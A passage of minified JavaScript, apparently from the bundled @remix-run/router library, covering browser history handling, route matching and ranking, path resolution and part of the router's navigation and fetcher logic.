        return typeof a == "string" ? a : sa(a)
    }
    return h2(t, n, null, e)
}
function Fe(e, t) {
    if (e === !1 || e === null || typeof e > "u")
        throw new Error(t)
}
function Qa(e, t) {
    if (!e) {
        typeof console < "u" && console.warn(t);
        try {
            throw new Error(t)
        } catch {}
    }
}
function p2() {
    return Math.random().toString(36).substr(2, 8)
}
function Sp(e, t) {
    return {
        usr: e.state,
        key: e.key,
        idx: t
    }
}
function li(e, t, n, r) {
    return n === void 0 && (n = null),
    dt({
        pathname: typeof e == "string" ? e : e.pathname,
        search: "",
        hash: ""
    }, typeof t == "string" ? Ir(t) : t, {
        state: n,
        key: t && t.key || r || p2()
    })
}
function sa(e) {
    let {pathname: t="/", search: n="", hash: r=""} = e;
    return n && n !== "?" && (t += n.charAt(0) === "?" ? n : "?" + n),
    r && r !== "#" && (t += r.charAt(0) === "#" ? r : "#" + r),
    t
}
function Ir(e) {
    let t = {};
    if (e) {
        let n = e.indexOf("#");
        n >= 0 && (t.hash = e.substr(n),
        e = e.substr(0, n));
        let r = e.indexOf("?");
        r >= 0 && (t.search = e.substr(r),
        e = e.substr(0, r)),
        e && (t.pathname = e)
    }
    return t
}
function h2(e, t, n, r) {
    r === void 0 && (r = {});
    let {window: a=document.defaultView, v5Compat: o=!1} = r
      , i = a.history
      , s = kt.Pop
      , u = null
      , c = f();
    c == null && (c = 0,
    i.replaceState(dt({}, i.state, {
        idx: c
    }), ""));
    function f() {
        return (i.state || {
            idx: null
        }).idx
    }
    function d() {
        s = kt.Pop;
        let x = f()
          , g = x == null ? null : x - c;
        c = x,
        u && u({
            action: s,
            location: S.location,
            delta: g
        })
    }
    function h(x, g) {
        s = kt.Push;
        let p = li(S.location, x, g);
        c = f() + 1;
        let m = Sp(p, c)
          , C = S.createHref(p);
        try {
            i.pushState(m, "", C)
        } catch (k) {
            if (k instanceof DOMException && k.name === "DataCloneError")
                throw k;
            a.location.assign(C)
        }
        o && u && u({
            action: s,
            location: S.location,
            delta: 1
        })
    }
    function N(x, g) {
        s = kt.Replace;
        let p = li(S.location, x, g);
        c = f();
        let m = Sp(p, c)
          , C = S.createHref(p);
        i.replaceState(m, "", C),
        o && u && u({
            action: s,
            location: S.location,
            delta: 0
        })
    }
    function y(x) {
        let g = a.location.origin !== "null" ? a.location.origin : a.location.href
          , p = typeof x == "string" ? x : sa(x);
        return p = p.replace(/ $/, "%20"),
        Fe(g, "No window.location.(origin|href) available to create URL for href: " + p),
        new URL(p,g)
    }
    let S = {
        get action() {
            return s
        },
        get location() {
            return e(a, i)
        },
        listen(x) {
            if (u)
                throw new Error("A history only accepts one active listener");
            return a.addEventListener(bp, d),
            u = x,
            () => {
                a.removeEventListener(bp, d),
                u = null
            }
        },
        createHref(x) {
            return t(a, x)
        },
        createURL: y,
        encodeLocation(x) {
            let g = y(x);
            return {
                pathname: g.pathname,
                search: g.search,
                hash: g.hash
            }
        },
        push: h,
        replace: N,
        go(x) {
            return i.go(x)
        }
    };
    return S
}
var et;
(function(e) {
    e.data = "data",
    e.deferred = "deferred",
    e.redirect = "redirect",
    e.error = "error"
}
)(et || (et = {}));
const m2 = new Set(["lazy", "caseSensitive", "path", "id", "index", "children"]);
function g2(e) {
    return e.index === !0
}
function $s(e, t, n, r) {
    return n === void 0 && (n = []),
    r === void 0 && (r = {}),
    e.map( (a, o) => {
        let i = [...n, String(o)]
          , s = typeof a.id == "string" ? a.id : i.join("-");
        if (Fe(a.index !== !0 || !a.children, "Cannot specify children on an index route"),
        Fe(!r[s], 'Found a route id collision on id "' + s + `".  Route id's must be globally unique within Data Router usages`),
        g2(a)) {
            let u = dt({}, a, t(a), {
                id: s
            });
            return r[s] = u,
            u
        } else {
            let u = dt({}, a, t(a), {
                id: s,
                children: void 0
            });
            return r[s] = u,
            a.children && (u.children = $s(a.children, t, i, r)),
            u
        }
    }
    )
}
function $r(e, t, n) {
    return n === void 0 && (n = "/"),
    ds(e, t, n, !1)
}
function ds(e, t, n, r) {
    let a = typeof t == "string" ? Ir(t) : t
      , o = to(a.pathname || "/", n);
    if (o == null)
        return null;
    let i = tg(e);
    v2(i);
    let s = null;
    for (let u = 0; s == null && u < i.length; ++u) {
        let c = T2(o);
        s = E2(i[u], c, r)
    }
    return s
}
function y2(e, t) {
    let {route: n, pathname: r, params: a} = e;
    return {
        id: n.id,
        pathname: r,
        params: a,
        data: t[n.id],
        handle: n.handle
    }
}
function tg(e, t, n, r) {
    t === void 0 && (t = []),
    n === void 0 && (n = []),
    r === void 0 && (r = "");
    let a = (o, i, s) => {
        let u = {
            relativePath: s === void 0 ? o.path || "" : s,
            caseSensitive: o.caseSensitive === !0,
            childrenIndex: i,
            route: o
        };
        u.relativePath.startsWith("/") && (Fe(u.relativePath.startsWith(r), 'Absolute route path "' + u.relativePath + '" nested under path ' + ('"' + r + '" is not valid. An absolute child route path ') + "must start with the combined path of all its parent routes."),
        u.relativePath = u.relativePath.slice(r.length));
        let c = Gn([r, u.relativePath])
          , f = n.concat(u);
        o.children && o.children.length > 0 && (Fe(o.index !== !0, "Index routes must not have child routes. Please remove " + ('all child routes from route path "' + c + '".')),
        tg(o.children, t, f, c)),
        !(o.path == null && !o.index) && t.push({
            path: c,
            score: k2(c, o.index),
            routesMeta: f
        })
    }
    ;
    return e.forEach( (o, i) => {
        var s;
        if (o.path === "" || !((s = o.path) != null && s.includes("?")))
            a(o, i);
        else
            for (let u of ng(o.path))
                a(o, i, u)
    }
    ),
    t
}
function ng(e) {
    let t = e.split("/");
    if (t.length === 0)
        return [];
    let[n,...r] = t
      , a = n.endsWith("?")
      , o = n.replace(/\?$/, "");
    if (r.length === 0)
        return a ? [o, ""] : [o];
    let i = ng(r.join("/"))
      , s = [];
    return s.push(...i.map(u => u === "" ? o : [o, u].join("/"))),
    a && s.push(...i),
    s.map(u => e.startsWith("/") && u === "" ? "/" : u)
}
function v2(e) {
    e.sort( (t, n) => t.score !== n.score ? n.score - t.score : j2(t.routesMeta.map(r => r.childrenIndex), n.routesMeta.map(r => r.childrenIndex)))
}
const x2 = /^:[\w-]+$/
  , w2 = 3
  , b2 = 2
  , S2 = 1
  , N2 = 10
  , C2 = -2
  , Np = e => e === "*";
function k2(e, t) {
    let n = e.split("/")
      , r = n.length;
    return n.some(Np) && (r += C2),
    t && (r += b2),
    n.filter(a => !Np(a)).reduce( (a, o) => a + (x2.test(o) ? w2 : o === "" ? S2 : N2), r)
}
function j2(e, t) {
    return e.length === t.length && e.slice(0, -1).every( (r, a) => r === t[a]) ? e[e.length - 1] - t[t.length - 1] : 0
}
function E2(e, t, n) {
    n === void 0 && (n = !1);
    let {routesMeta: r} = e
      , a = {}
      , o = "/"
      , i = [];
    for (let s = 0; s < r.length; ++s) {
        let u = r[s]
          , c = s === r.length - 1
          , f = o === "/" ? t : t.slice(o.length) || "/"
          , d = Cp({
            path: u.relativePath,
            caseSensitive: u.caseSensitive,
            end: c
        }, f)
          , h = u.route;
        if (!d && c && n && !r[r.length - 1].route.index && (d = Cp({
            path: u.relativePath,
            caseSensitive: u.caseSensitive,
            end: !1
        }, f)),
        !d)
            return null;
        Object.assign(a, d.params),
        i.push({
            params: a,
            pathname: Gn([o, d.pathname]),
            pathnameBase: R2(Gn([o, d.pathnameBase])),
            route: h
        }),
        d.pathnameBase !== "/" && (o = Gn([o, d.pathnameBase]))
    }
    return i
}
function Cp(e, t) {
    typeof e == "string" && (e = {
        path: e,
        caseSensitive: !1,
        end: !0
    });
    let[n,r] = _2(e.path, e.caseSensitive, e.end)
      , a = t.match(n);
    if (!a)
        return null;
    let o = a[0]
      , i = o.replace(/(.)\/+$/, "$1")
      , s = a.slice(1);
    return {
        params: r.reduce( (c, f, d) => {
            let {paramName: h, isOptional: N} = f;
            if (h === "*") {
                let S = s[d] || "";
                i = o.slice(0, o.length - S.length).replace(/(.)\/+$/, "$1")
            }
            const y = s[d];
            return N && !y ? c[h] = void 0 : c[h] = (y || "").replace(/%2F/g, "/"),
            c
        }
        , {}),
        pathname: o,
        pathnameBase: i,
        pattern: e
    }
}
function _2(e, t, n) {
    t === void 0 && (t = !1),
    n === void 0 && (n = !0),
    Qa(e === "*" || !e.endsWith("*") || e.endsWith("/*"), 'Route path "' + e + '" will be treated as if it were ' + ('"' + e.replace(/\*$/, "/*") + '" because the `*` character must ') + "always follow a `/` in the pattern. To get rid of this warning, " + ('please change the route path to "' + e.replace(/\*$/, "/*") + '".'));
    let r = []
      , a = "^" + e.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, (i, s, u) => (r.push({
        paramName: s,
        isOptional: u != null
    }),
    u ? "/?([^\\/]+)?" : "/([^\\/]+)"));
    return e.endsWith("*") ? (r.push({
        paramName: "*"
    }),
    a += e === "*" || e === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : n ? a += "\\/*$" : e !== "" && e !== "/" && (a += "(?:(?=\\/|$))"),
    [new RegExp(a,t ? void 0 : "i"), r]
}
function T2(e) {
    try {
        return e.split("/").map(t => decodeURIComponent(t).replace(/\//g, "%2F")).join("/")
    } catch (t) {
        return Qa(!1, 'The URL path "' + e + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' + ("encoding (" + t + ").")),
        e
    }
}
function to(e, t) {
    if (t === "/")
        return e;
    if (!e.toLowerCase().startsWith(t.toLowerCase()))
        return null;
    let n = t.endsWith("/") ? t.length - 1 : t.length
      , r = e.charAt(n);
    return r && r !== "/" ? null : e.slice(n) || "/"
}
function P2(e, t) {
    t === void 0 && (t = "/");
    let {pathname: n, search: r="", hash: a=""} = typeof e == "string" ? Ir(e) : e;
    return {
        pathname: n ? n.startsWith("/") ? n : O2(n, t) : t,
        search: A2(r),
        hash: L2(a)
    }
}
function O2(e, t) {
    let n = t.replace(/\/+$/, "").split("/");
    return e.split("/").forEach(a => {
        a === ".." ? n.length > 1 && n.pop() : a !== "." && n.push(a)
    }
    ),
    n.length > 1 ? n.join("/") : "/"
}
function iu(e, t, n, r) {
    return "Cannot include a '" + e + "' character in a manually specified " + ("`to." + t + "` field [" + JSON.stringify(r) + "].  Please separate it out to the ") + ("`to." + n + "` field. Alternatively you may provide the full path as ") + 'a string in <Link to="..."> and the router will parse it for you.'
}
function rg(e) {
    return e.filter( (t, n) => n === 0 || t.route.path && t.route.path.length > 0)
}
function vl(e, t) {
    let n = rg(e);
    return t ? n.map( (r, a) => a === n.length - 1 ? r.pathname : r.pathnameBase) : n.map(r => r.pathnameBase)
}
function xl(e, t, n, r) {
    r === void 0 && (r = !1);
    let a;
    typeof e == "string" ? a = Ir(e) : (a = dt({}, e),
    Fe(!a.pathname || !a.pathname.includes("?"), iu("?", "pathname", "search", a)),
    Fe(!a.pathname || !a.pathname.includes("#"), iu("#", "pathname", "hash", a)),
    Fe(!a.search || !a.search.includes("#"), iu("#", "search", "hash", a)));
    let o = e === "" || a.pathname === "", i = o ? "/" : a.pathname, s;
    if (i == null)
        s = n;
    else {
        let d = t.length - 1;
        if (!r && i.startsWith("..")) {
            let h = i.split("/");
            for (; h[0] === ".."; )
                h.shift(),
                d -= 1;
            a.pathname = h.join("/")
        }
        s = d >= 0 ? t[d] : "/"
    }
    let u = P2(a, s)
      , c = i && i !== "/" && i.endsWith("/")
      , f = (o || i === ".") && n.endsWith("/");
    return !u.pathname.endsWith("/") && (c || f) && (u.pathname += "/"),
    u
}
const Gn = e => e.join("/").replace(/\/\/+/g, "/")
  , R2 = e => e.replace(/\/+$/, "").replace(/^\/*/, "/")
  , A2 = e => !e || e === "?" ? "" : e.startsWith("?") ? e : "?" + e
  , L2 = e => !e || e === "#" ? "" : e.startsWith("#") ? e : "#" + e;
class Hs {
    constructor(t, n, r, a) {
        a === void 0 && (a = !1),
        this.status = t,
        this.statusText = n || "",
        this.internal = a,
        r instanceof Error ? (this.data = r.toString(),
        this.error = r) : this.data = r
    }
}
function wl(e) {
    return e != null && typeof e.status == "number" && typeof e.statusText == "string" && typeof e.internal == "boolean" && "data"in e
}
const ag = ["post", "put", "patch", "delete"]
  , I2 = new Set(ag)
  , M2 = ["get", ...ag]
  , D2 = new Set(M2)
  , z2 = new Set([301, 302, 303, 307, 308])
  , F2 = new Set([307, 308])
  , su = {
    state: "idle",
    location: void 0,
    formMethod: void 0,
    formAction: void 0,
    formEncType: void 0,
    formData: void 0,
    json: void 0,
    text: void 0
}
  , U2 = {
    state: "idle",
    data: void 0,
    formMethod: void 0,
    formAction: void 0,
    formEncType: void 0,
    formData: void 0,
    json: void 0,
    text: void 0
}
  , wo = {
    state: "unblocked",
    proceed: void 0,
    reset: void 0,
    location: void 0
}
  , Uf = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
  , B2 = e => ({
    hasErrorBoundary: !!e.hasErrorBoundary
})
  , og = "remix-router-transitions";
function $2(e) {
    const t = e.window ? e.window : typeof window < "u" ? window : void 0
      , n = typeof t < "u" && typeof t.document < "u" && typeof t.document.createElement < "u"
      , r = !n;
    Fe(e.routes.length > 0, "You must provide a non-empty routes array to createRouter");
    let a;
    if (e.mapRouteProperties)
        a = e.mapRouteProperties;
    else if (e.detectErrorBoundary) {
        let E = e.detectErrorBoundary;
        a = _ => ({
            hasErrorBoundary: E(_)
        })
    } else
        a = B2;
    let o = {}, i = $s(e.routes, a, void 0, o), s, u = e.basename || "/", c = e.dataStrategy || K2, f = e.patchRoutesOnNavigation, d = dt({
        v7_fetcherPersist: !1,
        v7_normalizeFormMethod: !1,
        v7_partialHydration: !1,
        v7_prependBasename: !1,
        v7_relativeSplatPath: !1,
        v7_skipActionErrorRevalidation: !1
    }, e.future), h = null, N = new Set, y = null, S = null, x = null, g = e.hydrationData != null, p = $r(i, e.history.location, u), m = null;
    if (p == null && !f) {
        let E = Gt(404, {
            pathname: e.history.location.pathname
        })
          , {matches: _, route: R} = Ip(i);
        p = _,
        m = {
            [R.id]: E
        }
    }
    p && !e.hydrationData && tn(p, i, e.history.location.pathname).active && (p = null);
    let C;
    if (p)
        if (p.some(E => E.route.lazy))
            C = !1;
        else if (!p.some(E => E.route.loader))
            C = !0;
        else if (d.v7_partialHydration) {
            let E = e.hydrationData ? e.hydrationData.loaderData : null
              , _ = e.hydrationData ? e.hydrationData.errors : null;
            if (_) {
                let R = p.findIndex(F => _[F.route.id] !== void 0);
                C = p.slice(0, R + 1).every(F => !mc(F.route, E, _))
            } else
                C = p.every(R => !mc(R.route, E, _))
        } else
            C = e.hydrationData != null;
    else if (C = !1,
    p = [],
    d.v7_partialHydration) {
        let E = tn(null, i, e.history.location.pathname);
        E.active && E.matches && (p = E.matches)
    }
    let k, w = {
        historyAction: e.history.action,
        location: e.history.location,
        matches: p,
        initialized: C,
        navigation: su,
        restoreScrollPosition: e.hydrationData != null ? !1 : null,
        preventScrollReset: !1,
        revalidation: "idle",
        loaderData: e.hydrationData && e.hydrationData.loaderData || {},
        actionData: e.hydrationData && e.hydrationData.actionData || null,
        errors: e.hydrationData && e.hydrationData.errors || m,
        fetchers: new Map,
        blockers: new Map
    }, A = kt.Pop, P = !1, K, $ = !1, Se = new Map, Te = null, Ae = !1, H = !1, X = [], J = new Set, Q = new Map, V = 0, le = -1, z = new Map, M = new Set, Y = new Map, ge = new Map, W = new Set, b = new Map, xe = new Map, ce;
    function Ne() {
        if (h = e.history.listen(E => {
            let {action: _, location: R, delta: F} = E;
            if (ce) {
                ce(),
                ce = void 0;
                return
            }
            Qa(xe.size === 0 || F != null, "You are trying to use a blocker on a POP navigation to a location that was not created by @remix-run/router. This will fail silently in production. This can happen if you are navigating outside the router via `window.history.pushState`/`window.location.hash` instead of using router navigation APIs.  This can also happen if you are using createHashRouter and the user manually changes the URL.");
            let te = mt({
                currentLocation: w.location,
                nextLocation: R,
                historyAction: _
            });
            if (te && F != null) {
                let ye = new Promise(Pe => {
                    ce = Pe
                }
                );
                e.history.go(F * -1),
                ct(te, {
                    state: "blocked",
                    location: R,
                    proceed() {
                        ct(te, {
                            state: "proceeding",
                            proceed: void 0,
                            reset: void 0,
                            location: R
                        }),
                        ye.then( () => e.history.go(F))
                    },
                    reset() {
                        let Pe = new Map(w.blockers);
                        Pe.set(te, wo),
                        Ce({
                            blockers: Pe
                        })
                    }
                });
                return
            }
            return O(_, R)
        }
        ),
        n) {
            ix(t, Se);
            let E = () => sx(t, Se);
            t.addEventListener("pagehide", E),
            Te = () => t.removeEventListener("pagehide", E)
        }
        return w.initialized || O(kt.Pop, w.location, {
            initialHydration: !0
        }),
        k
    }
    function $e() {
        h && h(),
        Te && Te(),
        N.clear(),
        K && K.abort(),
        w.fetchers.forEach( (E, _) => ut(_)),
        w.blockers.forEach( (E, _) => wt(_))
    }
    function Ue(E) {
        return N.add(E),
        () => N.delete(E)
    }
    function Ce(E, _) {
        _ === void 0 && (_ = {}),
        w = dt({}, w, E);
        let R = []
          , F = [];
        d.v7_fetcherPersist && w.fetchers.forEach( (te, ye) => {
            te.state === "idle" && (W.has(ye) ? F.push(ye) : R.push(ye))
        }
        ),
        [...N].forEach(te => te(w, {
            deletedFetchers: F,
            viewTransitionOpts: _.viewTransitionOpts,
            flushSync: _.flushSync === !0
        })),
        d.v7_fetcherPersist && (R.forEach(te => w.fetchers.delete(te)),
        F.forEach(te => ut(te)))
    }
    function Me(E, _, R) {
        var F, te;
        let {flushSync: ye} = R === void 0 ? {} : R, Pe = w.actionData != null && w.navigation.formMethod != null && kn(w.navigation.formMethod) && w.navigation.state === "loading" && ((F = E.state) == null ? void 0 : F._isRedirect) !== !0, Z;
        _.actionData ? Object.keys(_.actionData).length > 0 ? Z = _.actionData : Z = null : Pe ? Z = w.actionData : Z = null;
        let ie = _.loaderData ? Ap(w.loaderData, _.loaderData, _.matches || [], _.errors) : w.loaderData
          , re = w.blockers;
        re.size > 0 && (re = new Map(re),
        re.forEach( (Be, Nt) => re.set(Nt, wo)));
        let me = P === !0 || w.navigation.formMethod != null && kn(w.navigation.formMethod) && ((te = E.state) == null ? void 0 : te._isRedirect) !== !0;
        s && (i = s,
        s = void 0),
        Ae || A === kt.Pop || (A === kt.Push ? e.history.push(E, E.state) : A === kt.Replace && e.history.replace(E, E.state));
        let Ie;
        if (A === kt.Pop) {
            let Be = Se.get(w.location.pathname);
            Be && Be.has(E.pathname) ? Ie = {
                currentLocation: w.location,
                nextLocation: E
            } : Se.has(E.pathname) && (Ie = {
                currentLocation: E,
                nextLocation: w.location
            })
        } else if ($) {
            let Be = Se.get(w.location.pathname);
            Be ? Be.add(E.pathname) : (Be = new Set([E.pathname]),
            Se.set(w.location.pathname, Be)),
            Ie = {
                currentLocation: w.location,
                nextLocation: E
            }
        }
        Ce(dt({}, _, {
            actionData: Z,
            loaderData: ie,
            historyAction: A,
            location: E,
            initialized: !0,
            navigation: su,
            revalidation: "idle",
            restoreScrollPosition: Un(E, _.matches || w.matches),
            preventScrollReset: me,
            blockers: re
        }), {
            viewTransitionOpts: Ie,
            flushSync: ye === !0
        }),
        A = kt.Pop,
        P = !1,
        $ = !1,
        Ae = !1,
        H = !1,
        X = []
    }
    async function tt(E, _) {
        if (typeof E == "number") {
            e.history.go(E);
            return
        }
        let R = hc(w.location, w.matches, u, d.v7_prependBasename, E, d.v7_relativeSplatPath, _ == null ? void 0 : _.fromRouteId, _ == null ? void 0 : _.relative)
          , {path: F, submission: te, error: ye} = kp(d.v7_normalizeFormMethod, !1, R, _)
          , Pe = w.location
          , Z = li(w.location, F, _ && _.state);
        Z = dt({}, Z, e.history.encodeLocation(Z));
        let ie = _ && _.replace != null ? _.replace : void 0
          , re = kt.Push;
        ie === !0 ? re = kt.Replace : ie === !1 || te != null && kn(te.formMethod) && te.formAction === w.location.pathname + w.location.search && (re = kt.Replace);
        let me = _ && "preventScrollReset"in _ ? _.preventScrollReset === !0 : void 0
          , Ie = (_ && _.flushSync) === !0
          , Be = mt({
            currentLocation: Pe,
            nextLocation: Z,
            historyAction: re
        });
        if (Be) {
            ct(Be, {
                state: "blocked",
                location: Z,
                proceed() {
                    ct(Be, {
                        state: "proceeding",
                        proceed: void 0,
                        reset: void 0,
                        location: Z
                    }),
                    tt(E, _)
                },
                reset() {
                    let Nt = new Map(w.blockers);
                    Nt.set(Be, wo),
                    Ce({
                        blockers: Nt
                    })
                }
            });
            return
        }
        return await O(re, Z, {
            submission: te,
            pendingError: ye,
            preventScrollReset: me,
            replace: _ && _.replace,
            enableViewTransition: _ && _.viewTransition,
            flushSync: Ie
        })
    }
    function Xe() {
        if (ee(),
        Ce({
            revalidation: "loading"
        }),
        w.navigation.state !== "submitting") {
            if (w.navigation.state === "idle") {
                O(w.historyAction, w.location, {
                    startUninterruptedRevalidation: !0
                });
                return
            }
            O(A || w.historyAction, w.navigation.location, {
                overrideNavigation: w.navigation,
                enableViewTransition: $ === !0
            })
        }
    }
    async function O(E, _, R) {
        K && K.abort(),
        K = null,
        A = E,
        Ae = (R && R.startUninterruptedRevalidation) === !0,
        ma(w.location, w.matches),
        P = (R && R.preventScrollReset) === !0,
        $ = (R && R.enableViewTransition) === !0;
        let F = s || i
          , te = R && R.overrideNavigation
          , ye = $r(F, _, u)
          , Pe = (R && R.flushSync) === !0
          , Z = tn(ye, F, _.pathname);
        if (Z.active && Z.matches && (ye = Z.matches),
        !ye) {
            let {error: Ze, notFoundMatches: We, route: ft} = so(_.pathname);
            Me(_, {
                matches: We,
                loaderData: {},
                errors: {
                    [ft.id]: Ze
                }
            }, {
                flushSync: Pe
            });
            return
        }
        if (w.initialized && !H && J2(w.location, _) && !(R && R.submission && kn(R.submission.formMethod))) {
            Me(_, {
                matches: ye
            }, {
                flushSync: Pe
            });
            return
        }
        K = new AbortController;
        let ie = xa(e.history, _, K.signal, R && R.submission), re;
        if (R && R.pendingError)
            re = [Hr(ye).route.id, {
                type: et.error,
                error: R.pendingError
            }];
        else if (R && R.submission && kn(R.submission.formMethod)) {
            let Ze = await U(ie, _, R.submission, ye, Z.active, {
                replace: R.replace,
                flushSync: Pe
            });
            if (Ze.shortCircuited)
                return;
            if (Ze.pendingActionResult) {
                let[We,ft] = Ze.pendingActionResult;
                if (an(ft) && wl(ft.error) && ft.error.status === 404) {
                    K = null,
                    Me(_, {
                        matches: Ze.matches,
                        loaderData: {},
                        errors: {
                            [We]: ft.error
                        }
                    });
                    return
                }
            }
            ye = Ze.matches || ye,
            re = Ze.pendingActionResult,
            te = lu(_, R.submission),
            Pe = !1,
            Z.active = !1,
            ie = xa(e.history, ie.url, ie.signal)
        }
        let {shortCircuited: me, matches: Ie, loaderData: Be, errors: Nt} = await ae(ie, _, ye, Z.active, te, R && R.submission, R && R.fetcherSubmission, R && R.replace, R && R.initialHydration === !0, Pe, re);
        me || (K = null,
        Me(_, dt({
            matches: Ie || ye
        }, Lp(re), {
            loaderData: Be,
            errors: Nt
        })))
    }
    async function U(E, _, R, F, te, ye) {
        ye === void 0 && (ye = {}),
        ee();
        let Pe = ax(_, R);
        if (Ce({
            navigation: Pe
        }, {
            flushSync: ye.flushSync === !0
        }),
        te) {
            let re = await zr(F, _.pathname, E.signal);
            if (re.type === "aborted")
                return {
                    shortCircuited: !0
                };
            if (re.type === "error") {
                let me = Hr(re.partialMatches).route.id;
                return {
                    matches: re.partialMatches,
                    pendingActionResult: [me, {
                        type: et.error,
                        error: re.error
                    }]
                }
            } else if (re.matches)
                F = re.matches;
            else {
                let {notFoundMatches: me, error: Ie, route: Be} = so(_.pathname);
                return {
                    matches: me,
                    pendingActionResult: [Be.id, {
                        type: et.error,
                        error: Ie
                    }]
                }
            }
        }
        let Z, ie = Po(F, _);
        if (!ie.route.action && !ie.route.lazy)
            Z = {
                type: et.error,
                error: Gt(405, {
                    method: E.method,
                    pathname: _.pathname,
                    routeId: ie.route.id
                })
            };
        else if (Z = (await de("action", w, E, [ie], F, null))[ie.route.id],
        E.signal.aborted)
            return {
                shortCircuited: !0
            };
        if (Yr(Z)) {
            let re;
            return ye && ye.replace != null ? re = ye.replace : re = Pp(Z.response.headers.get("Location"), new URL(E.url), u) === w.location.pathname + w.location.search,
            await q(E, Z, !0, {
                submission: R,
                replace: re
            }),
            {
                shortCircuited: !0
            }
        }
        if (yr(Z))
            throw Gt(400, {
                type: "defer-action"
            });
        if (an(Z)) {
            let re = Hr(F, ie.route.id);
            return (ye && ye.replace) !== !0 && (A = kt.Push),
            {
                matches: F,
                pendingActionResult: [re.route.id, Z]
            }
        }
        return {
            matches: F,
            pendingActionResult: [ie.route.id, Z]
        }
    }
    async function ae(E, _, R, F, te, ye, Pe, Z, ie, re, me) {
        let Ie = te || lu(_, ye)
          , Be = ye || Pe || Dp(Ie)
          , Nt = !Ae && (!d.v7_partialHydration || !ie);
        if (F) {
            if (Nt) {
                let we = je(me);
                Ce(dt({
                    navigation: Ie
                }, we !== void 0 ? {
                    actionData: we
                } : {}), {
                    flushSync: re
                })
            }
            let pe = await zr(R, _.pathname, E.signal);
            if (pe.type === "aborted")
                return {
                    shortCircuited: !0
                };
            if (pe.type === "error") {
                let we = Hr(pe.partialMatches).route.id;
                return {
                    matches: pe.partialMatches,
                    loaderData: {},
                    errors: {
                        [we]: pe.error
                    }
                }
            } else if (pe.matches)
                R = pe.matches;
            else {
                let {error: we, notFoundMatches: Et, route: gt} = so(_.pathname);
                return {
                    matches: Et,
                    loaderData: {},
                    errors: {
                        [gt.id]: we
                    }
                }
            }
        }
        let Ze = s || i
          , [We,ft] = Ep(e.history, w, R, Be, _, d.v7_partialHydration && ie === !0, d.v7_skipActionErrorRevalidation, H, X, J, W, Y, M, Ze, u, me);
        if (lo(pe => !(R && R.some(we => we.route.id === pe)) || We && We.some(we => we.route.id === pe)),
        le = ++V,
        We.length === 0 && ft.length === 0) {
            let pe = at();
            return Me(_, dt({
                matches: R,
                loaderData: {},
                errors: me && an(me[1]) ? {
                    [me[0]]: me[1].error
                } : null
            }, Lp(me), pe ? {
                fetchers: new Map(w.fetchers)
            } : {}), {
                flushSync: re
            }),
            {
                shortCircuited: !0
            }
        }
        if (Nt) {
            let pe = {};
            if (!F) {
                pe.navigation = Ie;
                let we = je(me);
                we !== void 0 && (pe.actionData = we)
            }
            ft.length > 0 && (pe.fetchers = be(ft)),
            Ce(pe, {
                flushSync: re
            })
        }
        ft.forEach(pe => {
            St(pe.key),
            pe.controller && Q.set(pe.key, pe.controller)
        }
        );
        let v = () => ft.forEach(pe => St(pe.key));
        K && K.signal.addEventListener("abort", v);
        let {loaderResults: T, fetcherResults: D} = await Re(w, R, We, ft, E);
        if (E.signal.aborted)
            return {
                shortCircuited: !0
            };
        K && K.signal.removeEventListener("abort", v),
        ft.forEach(pe => Q.delete(pe.key));
        let B = qi(T);
        if (B)
            return await q(E, B.result, !0, {
                replace: Z
            }),
            {
                shortCircuited: !0
            };
        if (B = qi(D),
        B)
            return M.add(B.key),
            await q(E, B.result, !0, {
                replace: Z
            }),
            {
                shortCircuited: !0
            };
        let {loaderData: ve, errors: he} = Rp(w, R, T, me, ft, D, b);
        b.forEach( (pe, we) => {
            pe.subscribe(Et => {
                (Et || pe.done) && b.delete(we)
            }
            )
        }
        ),
        d.v7_partialHydration && ie && w.errors && (he = dt({}, w.errors, he));
        let ke = at()
          , Ye = L(le)
          , Qe = ke || Ye || ft.length > 0;
        return dt({
            matches: R,
            loaderData: ve,
            errors: he
        }, Qe ? {
            fetchers: new Map(w.fetchers)
        } : {})
    }
    function je(E) {
        if (E && !an(E[1]))
            return {
                [E[0]]: E[1].data
            };
        if (w.actionData)
            return Object.keys(w.actionData).length === 0 ? null : w.actionData
    }
    function be(E) {
        return E.forEach(_ => {
            let R = w.fetchers.get(_.key)
              , F = bo(void 0, R ? R.data : void 0);
            w.fetchers.set(_.key, F)
        }
        ),
        new Map(w.fetchers)
    }
    function _e(E, _, R, F) {
        if (r)
            throw new Error("router.fetch() was called during the server render, but it shouldn't be. You are likely calling a useFetcher() method in the body of your component. Try moving it to a useEffect or a callback.");
        St(E);
        let te = (F && F.flushSync) === !0
          , ye = s || i
          , Pe = hc(w.location, w.matches, u, d.v7_prependBasename, R, d.v7_relativeSplatPath, _, F == null ? void 0 : F.relative)
          , Z = $r(ye, Pe, u)
          , ie = tn(Z, ye, Pe);
        if (ie.active && ie.matches && (Z = ie.matches),
        !Z) {
            De(E, _, Gt(404, {
                pathname: Pe
            }), {
                flushSync: te
            });
            return
        }
        let {path: re, submission: me, error: Ie} = kp(d.v7_normalizeFormMethod, !0, Pe, F);
        if (Ie) {
            De(E, _, Ie, {
                flushSync: te
            });
            return
        }
        let Be = Po(Z, re)
          , Nt = (F && F.preventScrollReset) === !0;
        if (me && kn(me.formMethod)) {
            Oe(E, _, re, Be, Z, ie.active, te, Nt, me);
            return
        }
        Y.set(E, {
            routeId: _,
            path: re
        }),
        Ke(E, _, re, Be, Z, ie.active, te, Nt, me)
    }
    async function Oe(E, _, R, F, te, ye, Pe, Z, ie) {
        ee(),
        Y.delete(E);
        function re(ze) {
            if (!ze.route.action && !ze.route.lazy) {
                let ot = Gt(405, {
                    method: ie.formMethod,
                    pathname: R,
                    routeId: _
                });
                return De(E, _, ot, {
                    flushSync: Pe
                }),
                !0
            }
            return !1
        }
        if (!ye && re(F))
            return;
        let me = w.fetchers.get(E);
        oe(E, ox(ie, me), {
            flushSync: Pe
        });
        let Ie = new AbortController
          , Be = xa(e.history, R, Ie.signal, ie);
        if (ye) {
            let ze = await zr(te, R, Be.signal);
            if (ze.type === "aborted")
                return;
            if (ze.type === "error") {
                De(E, _, ze.error, {
                    flushSync: Pe
                });
                return
            } else if (ze.matches) {
                if (te = ze.matches,
                F = Po(te, R),
                re(F))
                    return
            } else {
                De(E, _, Gt(404, {
                    pathname: R
                }), {
